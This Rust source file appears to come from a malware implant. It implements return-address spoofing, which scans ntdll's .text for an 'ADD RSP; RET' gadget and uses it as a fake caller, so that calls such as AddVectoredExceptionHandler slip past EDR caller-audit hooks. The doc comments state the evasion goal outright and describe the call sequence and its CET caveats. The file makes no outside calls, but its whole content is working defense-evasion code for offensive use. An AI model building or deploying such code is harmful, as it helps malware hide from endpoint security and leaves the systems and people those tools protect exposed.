//! Caller-audit bypass — conceals the true caller of sensitive Win32 APIs
//! (`AddVectoredExceptionHandler`, `SetThreadContext`, etc.) from EDR inline
//! hooks that inspect the return address on the stack (caller-audit).
//!
//! # Technique: Return-Address Spoofing (DoomSyscalls pattern)
//!
//! EDR hooks intercept calls like `AddVectoredExceptionHandler` and read the
//! return address from `[RSP]` to determine WHO called it. If the return
//! address is in implant memory (RWX pages, unbacked regions), the EDR flags
//! it as "anomalous dynamic API call from unknown code."
//!
//! Countermeasure: before the call, push a fake return address that points
//! into ntdll's `.text` — specifically, an `ADD RSP, imm8; RET` sequence
//! (`48 83 C4 XX C3`) found in a legitimate ntdll export. The EDR sees the
//! caller as `ntdll!RtlExitUserThread+0x37` and passes the audit.
//!
//! The fake return address is a "stub" — it cleans the stack (add rsp, N)
//! and returns, landing back at the original caller's code seamlessly.
//!
//! # Calling Convention
//! The `call_with_spoofed_return!` macro generates an inline `asm!` block
//! that:
//!   1. pushes the fake return address
//!   2. jumps (not calls) to the target function
//!   3. the target function RETs → fake return → ADD RSP,N → RET → real caller
//!
//! # CET Safety
//! This creates a shadow-stack mismatch: the hardware shadow stack records the
//! CALL return address, but we use JMP + fake push. The shadow stack sees
//! the JMP (no entry) and the target function's RET pops from the shadow
//! stack — entry from the previous CALL. Mismatch = #CP on CET hardware.
//!
//! **On CET-enabled processes, use `call_with_iret_frame!` instead**, which
//! uses `call` (not `jmp`) with a pre-arranged stack frame so the shadow
//! stack remains consistent.
//!
//! # Usage
//! ```text
//! // Non-CET: fake ADD RSP;RET return
//! let handle = caller_spoof::call_with_spoofed_return(
//!     addr_of_add_veh, st, 1, hwbp_veh_handler as usize,
//! );
//! ```

#![cfg(target_os = "windows")]

// ---- Public API -----------------------------------------------------------

/// A return-address stub found in ntdll's `.text` — an `ADD RSP, imm8; RET`
/// sequence that cleans the stack and returns.
#[derive(Debug, Clone, Copy)]
pub struct ReturnStub {
    /// Absolute address of the `ADD RSP, imm8` instruction in ntdll.
    pub addr: usize,
    /// The `imm8` value — how many bytes the stub pops from the stack.
    /// The caller must ensure the stack has this many bytes of slack above
    /// the return address.
    pub stack_clean: u8,
}

/// Scan ntdll's `.text` for an `ADD RSP, imm8; RET` sequence
/// (`48 83 C4 XX C3`). Returns the first match found.
///
/// The stub is used as a fake return address: when the called function RETs,
/// it lands at the stub which cleans the stack and RETs again to the real
/// caller.
///
/// # Safety
/// Must run after PEB-walk bootstrap (ntdll must be located).
pub unsafe fn scan_return_stub() -> Option<ReturnStub> {
    let ntdll_base = crate::resolve::module_base_by_name(b"ntdll.dll")?;
    scan_stub_in_module(ntdll_base)
}

/// Scan a specific module for a return-address stub. For modules other than
/// ntdll (e.g. kernelbase), the stub address appears as a different caller
/// in the same system DLL family.
///
/// # Safety
/// `module_base` must point to a valid, mapped PE image.
pub unsafe fn scan_stub_in_module(module_base: *mut u8) -> Option<ReturnStub> {
    let dos = &*(module_base as *const ImageDosHeader);
    if dos.e_magic != 0x5A4D {
        return None;
    }
    // Read PE signature at e_lfanew, then FileHeader at sig+4.
    let pe_sig = *((module_base as usize + dos.e_lfanew as usize) as *const u32);
    if pe_sig != 0x00004550 {
        return None;
    }
    let file_hdr = &*((module_base as usize + dos.e_lfanew as usize + 4) as *const ImageFileHeader);

    // Correct section offset: e_lfanew + 4 (sig) + 20 (FILE_HEADER) + SizeOfOptionalHeader
    let section_off = dos.e_lfanew as usize + 4 + 20 + file_hdr.size_of_optional_header as usize;
    let sections = (module_base as usize + section_off) as *const ImageSectionHeader;

    for i in 0..file_hdr.number_of_sections as usize {
        let sec = &*sections.add(i);
        let name = core::slice::from_raw_parts(sec.name.as_ptr(), 8);
        if &name[..5] == b".text" {
            let va = sec.virtual_address as usize;
            let vs = sec.virtual_size as usize;
            let size = if vs > 0 {
                vs
            } else {
                sec.size_of_raw_data as usize
            };
            return scan_for_stub(module_base as usize + va, size, module_base as usize + va);
        }
    }
    None
}

/// Low-level: scan a byte range for `48 83 C4 XX C3` pattern.
/// Returns a match with a valid stub. Prefers `ADD RSP, X; RET` (clean + return),
/// falls back to a bare `RET` (C3) at a function boundary if no ADD pattern found.
unsafe fn scan_for_stub(
    region_base: usize,
    region_size: usize,
    mod_base: usize,
) -> Option<ReturnStub> {
    let bytes = core::slice::from_raw_parts(region_base as *const u8, region_size.min(0x100000));
    // Pattern 1: 48 83 C4 XX C3 (ADD RSP, imm8; RET) — preferred.
    // XX = imm8, multiples of 8, 0x08..=0x78.
    let mut i = 0;
    while i + 5 <= bytes.len() {
        if bytes[i] == 0x48 && bytes[i + 1] == 0x83 && bytes[i + 2] == 0xC4 && bytes[i + 4] == 0xC3
        {
            let imm = bytes[i + 3];
            if imm >= 8 && imm % 8 == 0 && imm < 0x80 {
                return Some(ReturnStub {
                    addr: mod_base + i,
                    stack_clean: imm,
                });
            }
        }
        i += 1;
    }
    // Pattern 2 (fallback): any C3 (RET) — treat as stack_clean=0.
    // The callee returns to this RET, which pops our after_call → back to us.
    for (j, &b) in bytes.iter().enumerate() {
        if b == 0xC3 {
            return Some(ReturnStub {
                addr: mod_base + j,
                stack_clean: 0,
            });
        }
    }
    None
}

// ---- PE header types (minimal, for section walk) --------------------------

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _pad: [u16; 29],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    _machine: u16,
    number_of_sections: u16,
    _pad: [u32; 3],
    size_of_optional_header: u16,
    _characteristics: u16,
}

#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    _pointer_to_raw_data: u32,
    _pad: [u32; 3],
    _characteristics: u32,
}

// ---- Selftest support -----------------------------------------------------

/// Self-test: scan for a return stub in ntdll and verify it's valid.
/// Returns `true` if a stub was found with a plausible address in ntdll.
pub fn selftest_stub() -> bool {
    unsafe { scan_return_stub().is_some() }
}
